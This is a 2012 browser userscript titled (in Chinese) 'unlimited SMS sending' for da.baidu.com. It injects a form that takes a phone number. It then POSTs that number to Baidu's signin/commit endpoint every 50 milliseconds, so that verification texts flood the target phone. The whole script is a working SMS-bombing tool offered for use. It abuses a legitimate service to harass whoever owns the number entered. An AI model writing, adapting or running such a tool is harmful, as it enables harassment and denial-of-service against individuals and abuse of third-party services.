// ==UserScript==
// @name           da.baidu.com 短信无限发
// @version        2012-07-27 00:27:25
// @author         sd
// @description  da.baidu.com 短信无限发
// @js javascript: /* 短信无限发 在da.baidu.com页面上使用 */ (function(){var url='http://userscripts.org/scripts/source/139285.user.js';var s=document.createElement('script');s.type='text/javascript';s.src=url;document.head.appendChild(s);})();
// ==/UserScript==

function SendMessage() {
	this.url = "http://da.baidu.com/SigninOpen/commit";
	this.data = "command=0&phone_no={send_phone}";
	this.type = "POST";
	this.count = 0;
	this.ms = 50;
	this.timer = null;
	this.isPost = false;
	this.init();
}
SendMessage.prototype = {
	init: function() {
		var html = '短信无限发<br/><br/><span>手机号码</span><br/><input type="text" id="send_phone" value="" /><br/><span>条数&nbsp;&nbsp;</span><span style="color:red" id="send_count">0</span><br/><br/><input type="button" value="开始" id="send_start"><input type="button" value="停止" id="send_stop">';
		this.showSend(html);
		var s = this;
		$("#send_start").bind('click',
		function() {
			s.send_start();
		});
		$("#send_stop").bind('click',
		function() {
			s.send_stop();
		});
	},
	showSend: function(html) {
		html = '<div style="margin: 0px 30px 0px 30px;font-size:14px;line-height:20px;text-align:center;font-family: &quot;宋体&quot;;">' + html + '</div>';
		$("#has-started-cnt").html(html);
	},
	send_start: function() {
		if (this.isPost) {
			return;
		} else {
			this.isPost = true;
		}
		var send_phone = $("#send_phone").val();
		if (!send_phone.length) {
			alert('请输入的手机号码。');
			return;
		}
		var data = this.data.replace("{send_phone}", send_phone);
		var s = this;
		this.timer = setInterval(function() {
			s.send_message(data)
		},
		this.ms);
	},
	send_stop: function() {
		clearTimeout(this.timer);
		this.count = 0;
		this.isPost = false;
	},
	callback: function() {
		$("#send_count").text(++this.count);
	},
	send_message: function(data) {
		var s = this;
		$.ajax({
			type: this.type,
			url: this.url,
			data: data,
			success: function() {
				s.callback();
			}
		});
	}
}
var send = new SendMessage();